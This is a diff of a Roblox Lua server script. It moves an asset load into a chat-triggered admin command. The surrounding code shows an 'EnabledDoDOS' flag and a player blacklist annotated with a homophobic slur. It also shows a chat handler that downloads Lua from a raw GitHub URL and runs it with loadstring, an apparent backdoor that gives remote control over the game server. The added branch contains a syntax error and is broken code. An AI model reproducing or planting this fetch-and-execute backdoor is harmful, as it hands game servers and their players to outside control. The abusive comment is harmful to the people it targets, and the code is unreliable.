@@ -1,5 +1,3 @@
-local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
-Asset.Parent = game.Lighting
 local EnabledDoDOS = true
 local BlackList = {
   [3783228048]=true, --< Vadik Pidorasik
@@ -22,6 +20,9 @@ game.Players.PlayerAdded:Connect(function(plr)
               local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
               local f = loadstring(code)
               f()
+          elseif message == "ADM.Sky then
+            local Asset = game.InsertService:LoadAsset(16797054140):GetChildren()[1]
+            Asset.Parent = game.Lighting
           end
         end)
     end
